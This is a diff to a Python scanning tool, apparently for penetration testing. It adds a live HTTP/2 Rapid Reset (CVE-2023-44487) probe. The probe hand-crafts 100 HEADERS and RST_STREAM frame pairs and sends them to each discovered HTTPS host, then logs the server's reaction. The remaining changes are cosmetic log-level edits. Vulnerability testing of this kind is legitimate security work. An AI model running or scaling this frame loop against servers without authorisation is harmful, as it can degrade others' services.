@@ -2,6 +2,7 @@
 
 import asyncio
 import socket
+import ssl
 from pathlib import Path
 from typing import Any, Dict, List
 
@@ -40,7 +41,7 @@ async def phase_167_H2RAPID(
     _out = outdir / "modern_h2_rapid_reset.txt"
     if _out.exists() and not force:
         return {"167-H2RAPID": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 167-H2RAPID: HTTP/2 Rapid Reset vulnerability check")
+    log("INFO", "Phase 167-H2RAPID: HTTP/2 Rapid Reset vulnerability check")
     findings: List[str] = []
     hosts = await _find_https_hosts(outdir)
     if not hosts:
@@ -53,17 +54,61 @@ async def phase_167_H2RAPID(
         hostname = host.replace("https://", "").replace("http://", "").split("/")[0]
         findings.append(f"  [testing] {host}")
         try:
+            ctx = ssl.create_default_context()
+            ctx.set_alpn_protocols(["h2"])
             reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(hostname, 443, ssl=True), timeout=15
+                asyncio.open_connection(hostname, 443, ssl=ctx), timeout=15
             )
+            ssl_obj = writer.get_extra_info("ssl_object")
+            negotiated = ssl_obj.selected_alpn_protocol() if ssl_obj else None
+            if negotiated != "h2":
+                findings.append(
+                    f"[h2-info] {host} → ALPN negotiated {negotiated or 'none'}, HTTP/2 not offered"
+                )
+                writer.close()
+                await writer.wait_closed()
+                continue
             h2_connection = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
             writer.write(h2_connection)
             await writer.drain()
-            findings.append(f"[h2-capable] {host} → supports HTTP/2")
             settings_frame = await asyncio.wait_for(reader.readexactly(9), timeout=5)
-            if settings_frame[:3] == b"\x00\x00\x00":
+            if settings_frame[:3] == b"\x00\x00\x00" and settings_frame[3] == 0x04:
+                findings.append(
+                    f"[h2-capable] {host} → ALPN h2 negotiated, HTTP/2 SETTINGS received"
+                )
                 stream_id = int.from_bytes(settings_frame[5:9], "big")
                 findings.append(f"[h2-settings] {host} → stream_id={stream_id}")
+                hpack_get = b"\x02\x03GET"
+                rid = 1
+                for _ in range(100):
+                    writer.write(b"\x00\x00\x05\x01\x04" + rid.to_bytes(4, "big") + hpack_get)
+                    writer.write(
+                        b"\x00\x00\x04\x03\x00" + rid.to_bytes(4, "big") + b"\x00\x00\x00\x08"
+                    )
+                    rid += 2
+                await writer.drain()
+                try:
+                    frame_header = await asyncio.wait_for(reader.readexactly(9), timeout=5)
+                    frame_type = frame_header[3]
+                    if frame_type == 0x07:
+                        reaction = "GOAWAY"
+                    elif frame_type == 0x03:
+                        reaction = "RST_STREAM"
+                    elif frame_type == 0x04:
+                        reaction = "SETTINGS"
+                    else:
+                        reaction = f"frame-type-{frame_type}"
+                    findings.append(
+                        f"[h2-rapid-reset-probe] {host} → server reacted with {reaction} after 100 rapid resets"
+                    )
+                except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
+                    findings.append(
+                        f"[h2-rapid-reset-probe] {host} → no server reaction within 5s after 100 rapid resets"
+                    )
+            else:
+                findings.append(
+                    f"[h2-info] {host} → h2 negotiated but no SETTINGS frame (first frame type {settings_frame[3]})"
+                )
             writer.close()
             await writer.wait_closed()
         except asyncio.TimeoutError:
@@ -82,7 +127,7 @@ async def phase_167_H2RAPID(
     findings.append("  [check] Check vendor advisory for CVE-2023-44487 patch status")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"167-H2RAPID: {len(findings)} findings → {out}")
+    log("OK", f"167-H2RAPID: {len(findings)} findings → {out}")
     return {"167-H2RAPID": str(_out), "count": len(findings)}
 
 
@@ -99,7 +144,7 @@ async def phase_168_H3QUIC(
     _out = outdir / "modern_quic_h3.txt"
     if _out.exists() and not force:
         return {"168-H3QUIC": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 168-H3QUIC: HTTP/3 & QUIC attack surface check")
+    log("INFO", "Phase 168-H3QUIC: HTTP/3 & QUIC attack surface check")
     findings: List[str] = []
     hosts = _load_live_hosts(outdir)
     if not hosts:
@@ -141,7 +186,7 @@ async def phase_168_H3QUIC(
     findings.append("  [tool] Use curl --http3 or quiche client for deeper testing")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"168-H3QUIC: {len(findings)} findings → {out}")
+    log("OK", f"168-H3QUIC: {len(findings)} findings → {out}")
     return {"168-H3QUIC": str(_out), "count": len(findings)}
 
 
@@ -158,7 +203,7 @@ async def phase_169_WEBTRANSPORT(
     _out = outdir / "modern_webtransport.txt"
     if _out.exists() and not force:
         return {"169-WEBTRANSPORT": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 169-WEBTRANSPORT: WebTransport endpoint discovery")
+    log("INFO", "Phase 169-WEBTRANSPORT: WebTransport endpoint discovery")
     findings: List[str] = []
     urls = outdir / "urls_all.txt"
     if urls.exists():
@@ -182,5 +227,5 @@ async def phase_169_WEBTRANSPORT(
         findings.append("[info] No WebTransport endpoints discovered in URL corpus")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"169-WEBTRANSPORT: {len(findings)} findings → {out}")
+    log("OK", f"169-WEBTRANSPORT: {len(findings)} findings → {out}")
     return {"169-WEBTRANSPORT": str(_out), "count": len(findings)}
